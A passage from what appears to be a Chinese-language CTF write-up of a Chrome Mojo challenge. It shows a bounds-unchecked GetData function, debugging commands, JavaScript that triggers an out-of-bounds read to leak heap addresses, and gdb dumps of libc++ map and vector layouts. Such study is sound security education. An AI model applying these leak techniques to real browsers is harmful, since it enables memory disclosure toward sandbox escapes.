<li>OOB<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PlaidStoreImpl::GetData</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;key,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">uint32_t</span> count,</span></span></span><br><span class="line"><span class="function"><span class="params">    GetDataCallback callback)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!render_frame_host_-&gt;IsRenderFrameLive()) &#123; <span class="comment">// use</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">move</span>(callback).Run(&#123;&#125;);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">auto</span> it = data_store_.<span class="built_in">find</span>(key);</span><br><span class="line">  <span class="keyword">if</span> (it == data_store_.<span class="built_in">end</span>()) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">move</span>(callback).Run(&#123;&#125;);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">uint8_t</span>&gt; <span class="title">result</span><span class="params">(it-&gt;second.<span class="built_in">begin</span>(), it-&gt;second.<span class="built_in">begin</span>() + count)</span></span>;<span class="comment">//oob</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">move</span>(callback).Run(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
可以看出并没有约束count的大小，所以我们可以通过getData来越界读并返回读取的结果。</li>
</ul>
<h3 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h3><ul>
<li>解压mojo题，在本地开启一个server<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~&#x2F;mojo$ ls</span><br><span class="line">cc                      Dockerfile    mojo_js.zip      third_party</span><br><span class="line">chrome                  extensions    plaidstore.diff  trigger.html</span><br><span class="line">chrome_100_percent.pak  flag_printer  resources.pak    ui</span><br><span class="line">chrome_200_percent.pak  gpu           run.sh           url</span><br><span class="line">chrome.zip              icudtl.dat    server.py        v8_context_snapshot.bin</span><br><span class="line">components              ipc           services         visit.sh</span><br><span class="line">content                 locales       skia</span><br><span class="line">device                  media         storage</span><br><span class="line">devtools                mojo          swiftshader</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">sakura@ubuntu:~&#x2F;mojo$ python3 -m http.serverServing HTTP on 0.0.0.0 port 8000 ...</span><br><span class="line">127.0.0.1 - - [20&#x2F;Sep&#x2F;2020 08:37:21] &quot;GET &#x2F;trigger.html HTTP&#x2F;1.1&quot; 200 -</span><br><span class="line">127.0.0.1 - - [20&#x2F;Sep&#x2F;2020 09:36:21] &quot;GET &#x2F;trigger.html HTTP&#x2F;1.1&quot; 200 -</span><br><span class="line">127.0.0.1 - - [20&#x2F;Sep&#x2F;2020 09:36:28] &quot;GET &#x2F;trigger.html HTTP&#x2F;1.1&quot; 200 -</span><br></pre></td></tr></table></figure></li>
<li>启动chrome<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~&#x2F;mojo$ .&#x2F;chrome --headless --disable-gpu --remote-debugging-port&#x3D;1338 --user-data-dir&#x3D;&#x2F;tmp&#x2F;noexist --enable-blink-features&#x3D;MojoJS,MojoJSTest http:&#x2F;&#x2F;localhost:8000&#x2F;trigger.html</span><br></pre></td></tr></table></figure></li>
<li>debug启动chrome<br>写一个debug.sh，注意因为我们要调试的是browser进程，所以要跟随parent。<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file ./chrome</span><br><span class="line"><span class="built_in">set</span> args --headless --<span class="built_in">disable</span>-gpu --remote-debugging-port=1338 --user-data-dir=/tmp/noexist --<span class="built_in">enable</span>-blink-features=MojoJS,MojoJSTest http://localhost:8000/trigger.html</span><br><span class="line"><span class="built_in">set</span> follow-fork-mode parent</span><br></pre></td></tr></table></figure>
执行<code>gdb -x debug.sh</code></li>
</ul>
<h3 id="oob-leak-and-gadget"><a href="#oob-leak-and-gadget" class="headerlink" title="oob leak and gadget"></a>oob leak and gadget</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">oob</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"oob"</span>);</span><br><span class="line">    <span class="keyword">var</span> pipe = Mojo.createMessagePipe();</span><br><span class="line">    Mojo.bindInterface(blink.mojom.PlaidStore.name,</span><br><span class="line">    pipe.handle1, <span class="string">"context"</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">var</span> plaid_store_ptr = <span class="keyword">new</span> blink.mojom.PlaidStorePtr(pipe.handle0);</span><br><span class="line">    <span class="keyword">await</span> plaid_store_ptr.storeData(<span class="string">"aaa"</span>, [<span class="number">0x31</span>,<span class="number">0x32</span>,<span class="number">0x33</span>,<span class="number">0x34</span>,<span class="number">0x35</span>,<span class="number">0x36</span>,<span class="number">0x37</span>,<span class="number">0x38</span>,<span class="number">0x41</span>,<span class="number">0x42</span>,<span class="number">0x43</span>,<span class="number">0x44</span>,<span class="number">0x45</span>,<span class="number">0x46</span>,<span class="number">0x47</span>,<span class="number">0x48</span>]);</span><br><span class="line">    oob_data = <span class="keyword">await</span> plaid_store_ptr.getData(<span class="string">"aaa"</span>,<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(hex(b2i(oob_data.data.slice(<span class="number">0x10</span>,<span class="number">0x18</span>))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[0920&#x2F;093628.390634:INFO:CONSOLE(178)] &quot;oob&quot;, source: http:&#x2F;&#x2F;localhost:8000&#x2F;trigger.html (178)</span><br><span class="line">[0920&#x2F;093628.430111:INFO:CONSOLE(186)] &quot;0x55ab6560a8b0&quot;, source: http:&#x2F;&#x2F;localhost:8000&#x2F;trigger.html (186)</span><br></pre></td></tr></table></figure>
<p>可以看出我们leak出了一个很像地址的东西，那么我们可以调试一下我们到底可以越界读取到什么</p>
<ul>
<li>首先我们可以看看创建PlaidStoreImpl的函数，并下一个断点，我们可以<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ info functions PlaidStoreImpl</span><br><span class="line">All functions matching regular expression &quot;PlaidStoreImpl&quot;:</span><br><span class="line">Non-debugging symbols:</span><br><span class="line">0x0000000003c58170  content::PlaidStoreImpl::~PlaidStoreImpl()</span><br><span class="line">0x0000000003c58170  content::PlaidStoreImpl::~PlaidStoreImpl()</span><br><span class="line">0x0000000003c58190  content::PlaidStoreImpl::~PlaidStoreImpl()</span><br><span class="line">0x0000000003c581c0  content::PlaidStoreImpl::StoreData(std::__1::basic_string&lt;char, std::__1::char_traits&lt;char&gt;, std::__1::allocator&lt;char&gt; &gt; const&amp;, std::__1::vector&lt;unsigned char, std::__1::allocator&lt;unsigned char&gt; &gt; const&amp;)</span><br><span class="line">0x0000000003c582b0  content::PlaidStoreImpl::GetData(std::__1::basic_string&lt;char, std::__1::char_traits&lt;char&gt;, std::__1::allocator&lt;char&gt; &gt; const&amp;, unsigned int, base::OnceCallback&lt;void (std::__1::vector&lt;unsigned char, std::__1::allocator&lt;unsigned char&gt; &gt; const&amp;)&gt;)</span><br><span class="line">0x0000000003c58490  content::PlaidStoreImpl::Create(content::RenderFrameHost*, mojo::PendingReceiver&lt;blink::mojom::PlaidStore&gt;)</span><br><span class="line">0x0000000003c58550  base::WeakPtr&lt;mojo::StrongBinding&lt;blink::mojom::PlaidStore&gt; &gt; mojo::MakeSelfOwnedReceiver&lt;blink::mojom::PlaidStore, content::PlaidStoreImpl&gt;(std::__1::unique_ptr&lt;content::PlaidStoreImpl, std::__1::default_delete&lt;content::PlaidStoreImpl&gt; &gt;, mojo::PendingReceiver&lt;blink::mojom::PlaidStore&gt;, scoped_refptr&lt;base::SequencedTaskRunner&gt;)</span><br><span class="line">...</span><br><span class="line">(gdb) b content::PlaidStoreImpl::Create</span><br><span class="line">Breakpoint 1 at 0x3c58494</span><br><span class="line">(gdb) r</span><br><span class="line">...</span><br><span class="line">&#x3D;&gt; 0x5555591ac494 &lt;plaid_store_ptrPlaidStoreEEE+4&gt;:	push   r15</span><br><span class="line">   0x5555591ac496 &lt;plaid_store_ptrPlaidStoreEEE+6&gt;:	push   r14</span><br><span class="line">   0x5555591ac498 &lt;plaid_store_ptrPlaidStoreEEE+8&gt;:	push   rbx</span><br><span class="line">   0x5555591ac499 &lt;plaid_store_ptrPlaidStoreEEE+9&gt;:	sub    rsp,0x38</span><br><span class="line">   0x5555591ac49d &lt;plaid_store_ptrPlaidStoreEEE+13&gt;:	mov    r14,rsi</span><br><span class="line">   0x5555591ac4a0 &lt;plaid_store_ptrPlaidStoreEEE+16&gt;:	mov    rbx,rdi</span><br><span class="line">   0x5555591ac4a3 &lt;plaid_store_ptrPlaidStoreEEE+19&gt;:	mov    edi,0x28 &#x2F;&#x2F;从这里可以看出impl的大小是0x28</span><br><span class="line">   0x5555591ac4a8 &lt;plaid_store_ptrPlaidStoreEEE+24&gt;:	</span><br><span class="line">    call   0x55555ac584b0 &lt;_ZnwmRKSt9nothrow_t&gt; &#x2F;&#x2F;operator new(unsigned long, std::nothrow_t const&amp;),注意这条语句执行完了之后的rax就是impl的地址，所以我会在知道了这个地址之后，直接finish这个函数，然后看最终的对象布局。</span><br><span class="line">   0x5555591ac4ad &lt;plaid_store_ptrPlaidStoreEEE+29&gt;:	</span><br><span class="line">    lea    rcx,[rip+0x635e2ec]        # 0x55555f50a7a0 &lt;_ZTVN7content14PlaidStoreImplE+16&gt; &#x2F;&#x2F;vtable for content::PlaidStoreImpl</span><br><span class="line">   0x5555591ac4b4 &lt;plaid_store_ptrPlaidStoreEEE+36&gt;:	mov    QWORD PTR [rax],rcx</span><br><span class="line">   0x5555591ac4b7 &lt;plaid_store_ptrPlaidStoreEEE+39&gt;:	</span><br><span class="line">    mov    QWORD PTR [rax+0x8],rbx</span><br><span class="line">   0x5555591ac4bb &lt;plaid_store_ptrPlaidStoreEEE+43&gt;:	lea    rcx,[rax+0x18]</span><br><span class="line">   0x5555591ac4bf &lt;plaid_store_ptrPlaidStoreEEE+47&gt;:	xorps  xmm0,xmm0</span><br><span class="line">   0x5555591ac4c2 &lt;plaid_store_ptrPlaidStoreEEE+50&gt;:	</span><br><span class="line">    movups XMMWORD PTR [rax+0x18],xmm0</span><br><span class="line">   0x5555591ac4c6 &lt;_ZN7content14PlaidStoreImpl6Crea</span><br><span class="line">...</span><br><span class="line">&#x2F;&#x2F;在执行了call指令之后，返回的rax的值，就是plaidstoreimpl的地址</span><br><span class="line">gdb-peda$ x&#x2F;20gx 0x2dd26ed2ede0</span><br><span class="line">0x2dd26ed2ede0:	0x000055555f50a7a0 &#x2F;&#x2F;vtable	0x00002dd26ec42400 &#x2F;&#x2F; render_frame_host_</span><br><span class="line">0x2dd26ed2edf0:	|map start| 0x00002dd26ed2edf8 	0x0000000000000000</span><br><span class="line">0x2dd26ed2ee00:	0x0000000000000000|map end| --&gt; &#x2F;&#x2F; data_store_</span><br></pre></td></tr></table></figure></li>
<li>然后我们执行到storeData结束，看看此时data_store_这个map是怎么保存数据的。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;20gx 0x00002dd26ed33870 &#x2F;&#x2F;data_store_</span><br><span class="line">0x2dd26ed33870:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x2dd26ed33880:	0x00002dd26ed2edf8	0x000055555aba0101</span><br><span class="line">0x2dd26ed33890:	0x0000000000616161&#x2F;&#x2F;key1	0x0000000000000000</span><br><span class="line">0x2dd26ed338a0:	0x0300000000000000	0x00002dd26ed2f0b0&#x2F;&#x2F;value1</span><br><span class="line">0x2dd26ed338b0:	0x00002dd26ed2f0c0	0x00002dd26ed2f0c0</span><br><span class="line">0x2dd26ed338c0:	0xffffd22f00000001	0x0000000000000000</span><br><span class="line">0x2dd26ed338d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x2dd26ed338e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x2dd26ed338f0:	0x00002dd26ed00000	0x00002dd26ec1c0c0</span><br><span class="line">0x2dd26ed33900:	0x00002dd26ec1c0c0	0x0000000000000001</span><br><span class="line">gdb-peda$ x&#x2F;20gx 0x00002dd26ed2f0b0</span><br><span class="line">0x2dd26ed2f0b0:	0x3837363534333231	0x4847464544434241</span><br><span class="line">0x2dd26ed2f0c0:	0xffffd20000000001	0xfffffffd55553ec2</span><br><span class="line">0x2dd26ed2f0d0:	0xffffd20000000001	0xfffffffd55553ec2</span><br><span class="line">0x2dd26ed2f0e0:	0xffffd20000000001	0xfffffffd55553ec2</span><br><span class="line">0x2dd26ed2f0f0:	0xffffd20000000001	0xfffffffd55553ec2</span><br></pre></td></tr></table></figure>
为了继续往下，我需要简要的描述一下map的内存布局,chrome里使用的std::map标准库实现在<a href="https://source.chromium.org/chromium/chromium/src/+/master:buildtools/third_party/libc++/trunk/include/map" target="_blank" rel="noopener">这里</a><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Key</span>, <span class="title">class</span> _<span class="title">CP</span>, <span class="title">class</span> _<span class="title">Compare</span>,</span></span><br><span class="line"><span class="class">          <span class="title">bool</span> = <span class="title">is_empty</span>&lt;_Compare&gt;:</span>:value &amp;&amp; !__libcpp_is_final&lt;_Compare&gt;::value&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> __<span class="title">map_value_compare</span></span></span><br><span class="line"><span class="class">    :</span> <span class="keyword">private</span> _Compare</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">typedef</span> __tree&lt;__value_type, __vc, __allocator_type&gt;   __base;</span><br><span class="line">    __base __tree_;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
其实只有一个字段，也就是保存了一个<code>__tree</code>类型的成员变量，其实这就是红黑树(rb tree)的实现，map其实是rb tree的一层wrapper，实际的插入删除等，都是在<code>__tree</code>上完成的。<br>所以我们直接看<code>__tree</code>的内存布局即可。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Tp</span>, <span class="title">class</span> _<span class="title">Compare</span>, <span class="title">class</span> _<span class="title">Allocator</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> __<span class="title">tree</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    __iter_pointer                                     __begin_node_;</span><br><span class="line">    __compressed_pair&lt;<span class="keyword">__end_node_t</span>, __node_allocator&gt;  __pair1_;</span><br><span class="line">    __compressed_pair&lt;size_type, value_compare&gt;        __pair3_;</span><br></pre></td></tr></table></figure>
其有三个成员变量，一个是指向起始tree_node的指针，其他两个字段用不到，也就不解释了。<br>那么我们现在就知道了，对于如下impl，其偏移0x10位置处就是保持着map的起始节点，而map是一颗rb tree，所以从这个节点我们就可以索引到其他所有插入的节点了。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;20gx 0x2dd26ed2ede0</span><br><span class="line">0x2dd26ed2ede0:	0x000055555f50a7a0 &#x2F;&#x2F;vtable	0x00002dd26ec42400 &#x2F;&#x2F; render_frame_host_</span><br><span class="line">0x2dd26ed2edf0:	|map start| 0x00002dd26ed2edf8 	0x0000000000000000</span><br><span class="line">0x2dd26ed2ee00:	0x0000000000000000|map end| --&gt; &#x2F;&#x2F; data_store_</span><br></pre></td></tr></table></figure>
现在让我们看一下tree_node的具体内存布局<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Pointer</span>&gt; <span class="title">class</span> __<span class="title">tree_end_node</span>;</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">VoidPtr</span>&gt; <span class="title">class</span> __<span class="title">tree_node_base</span>;</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Tp</span>, <span class="title">class</span> _<span class="title">VoidPtr</span>&gt; <span class="title">class</span> __<span class="title">tree_node</span>;</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">// node</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Pointer</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> __<span class="title">tree_end_node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">typedef</span> _Pointer pointer;</span><br><span class="line">    pointer __left_;</span><br><span class="line"></span><br><span class="line">    _LIBCPP_INLINE_VISIBILITY</span><br><span class="line">    __tree_end_node() _NOEXCEPT : __left_() &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">VoidPtr</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> __<span class="title">tree_node_base</span></span></span><br><span class="line"><span class="class">    :</span> <span class="keyword">public</span> __tree_node_base_types&lt;_VoidPtr&gt;::__end_node_type</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">typedef</span> __tree_node_base_types&lt;_VoidPtr&gt; _NodeBaseTypes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">typename</span> _NodeBaseTypes::__node_base_pointer pointer;</span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">typename</span> _NodeBaseTypes::__parent_pointer __parent_pointer;</span><br><span class="line"></span><br><span class="line">    pointer          __right_;</span><br><span class="line">    __parent_pointer __parent_;</span><br><span class="line">    <span class="keyword">bool</span> __is_black_;</span><br><span class="line"></span><br><span class="line">    _LIBCPP_INLINE_VISIBILITY</span><br><span class="line">    pointer __parent_unsafe() <span class="keyword">const</span> &#123; <span class="keyword">return</span> <span class="keyword">static_cast</span>&lt;pointer&gt;(__parent_);&#125;</span><br><span class="line"></span><br><span class="line">    _LIBCPP_INLINE_VISIBILITY</span><br><span class="line">    <span class="keyword">void</span> __set_parent(pointer __p) &#123;</span><br><span class="line">        __parent_ = <span class="keyword">static_cast</span>&lt;__parent_pointer&gt;(__p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  ~__tree_node_base() _LIBCPP_EQUAL_DELETE;</span><br><span class="line">  __tree_node_base(__tree_node_base <span class="keyword">const</span>&amp;) _LIBCPP_EQUAL_DELETE;</span><br><span class="line">  __tree_node_base&amp; <span class="keyword">operator</span>=(__tree_node_base <span class="keyword">const</span>&amp;) _LIBCPP_EQUAL_DELETE;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Tp</span>, <span class="title">class</span> _<span class="title">VoidPtr</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> __<span class="title">tree_node</span></span></span><br><span class="line"><span class="class">    :</span> <span class="keyword">public</span> __tree_node_base&lt;_VoidPtr&gt;</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">typedef</span> _Tp __node_value_type;</span><br><span class="line"></span><br><span class="line">    __node_value_type __value_;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  ~__tree_node() _LIBCPP_EQUAL_DELETE;</span><br><span class="line">  __tree_node(__tree_node <span class="keyword">const</span>&amp;) _LIBCPP_EQUAL_DELETE;</span><br><span class="line">  __tree_node&amp; <span class="keyword">operator</span>=(__tree_node <span class="keyword">const</span>&amp;) _LIBCPP_EQUAL_DELETE;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
所以对于一个tree_node，其保存的字段依次为，前四个大小是固定的，其整体大小依据<code>__node_value_type</code>的大小来决定，这个node_value_type实际上就是key-value这样一个pair对，在这里就是<code>pair&lt;string,vector&lt;uint8_t&gt;&gt;</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x0 pointer __left_;</span><br><span class="line">0x8 pointer          __right_;</span><br><span class="line">0x10 __parent_pointer __parent_;</span><br><span class="line">0x18 bool __is_black_;</span><br><span class="line">0x20 __node_value_type __value_;</span><br></pre></td></tr></table></figure>
所以我们来看一下内存<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;PlaidStoreImpl</span><br><span class="line">gdb-peda$ x&#x2F;20gx 0x00003268b2727f00</span><br><span class="line">0x3268b2727f00:	0x000055555f50a7a0	0x00003268b2643400</span><br><span class="line">0x3268b2727f10:	0x00003268b271a780&#x2F;&#x2F;first tree node	0x00003268b271a780</span><br><span class="line">0x3268b2727f20:	0x0000000000000001</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;20gx 0x00003268b271a780</span><br><span class="line">0x3268b271a780:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x3268b271a790:	0x00003268b2727f18	0x0000000000000001</span><br><span class="line">0x3268b271a7a0:	|0x0000000061616161	0x0000000000000000</span><br><span class="line">0x3268b271a7b0:	0x0400000000000000|--&gt;string | 0x00003268b2757ba0--&gt;vector</span><br><span class="line">0x3268b271a7c0:	0x00003268b2757bc8	0x00003268b2757bc8 |</span><br><span class="line">...</span><br><span class="line">&#x2F;&#x2F; vector elements</span><br><span class="line">gdb-peda$ x&#x2F;20gx 0x00003268b2757ba0</span><br><span class="line">0x3268b2757ba0:	0x3131313131313131	0x3131313131313131</span><br><span class="line">0x3268b2757bb0:	0x3131313131313131	0x3131313131313131</span><br><span class="line">0x3268b2757bc0:	0x3131313131313131	0x0000000000000000</span><br></pre></td></tr></table></figure>
string的对象布局我没有看，不过我简单的解释一下这里为什么vector是这样的，因为其包括三个成员变量，首先是vector里元素的起始地址，然后是终止地址和容量。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> __<span class="title">vector_base</span></span></span><br><span class="line"><span class="class">    <span class="title">pointer</span>                                         __<span class="title">begin_</span>;</span></span><br><span class="line">    pointer                                         __end_;</span><br><span class="line">    __compressed_pair&lt;pointer, allocator_type&gt; __end_cap_;</span><br></pre></td></tr></table></figure>
而此时我们的oob，也就是从vector的起始地址开始，可以越界读到后面的任意地址的值。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ vmmap 0x00003268b2757ba0</span><br><span class="line">Start              End                Perm	Name</span><br><span class="line">0x00003268b237d000 0x00003268b287c000 rw-p	mapped</span><br><span class="line">gdb-peda$ vmmap 0x00003268b2727f00</span><br><span class="line">Start              End                Perm	Name</span><br><span class="line">0x00003268b237d000 0x00003268b287c000 rw-p	mapped</span><br></pre></td></tr></table></figure>
